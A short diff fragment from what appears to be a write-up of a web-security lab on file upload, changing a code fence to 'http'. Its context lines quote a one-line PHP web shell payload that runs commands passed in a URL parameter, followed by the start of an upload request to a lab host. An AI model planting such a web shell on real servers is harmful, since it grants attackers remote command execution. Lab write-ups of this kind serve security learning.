@@ -17,7 +17,7 @@ When we upload a `.php` file with the payload **<?php echo system($_GET['command
 
 Let's take a look at the request sent when uploading the file.
 
-```
+```http
 POST /my-account/avatar HTTP/1.1
 Host: 0a1000bb04122918814bd9d000d400c5.web-security-academy.net
 Cookie: session=pFjBEs7PaXo8VlIvWFeyV3Q6z05fpBD4
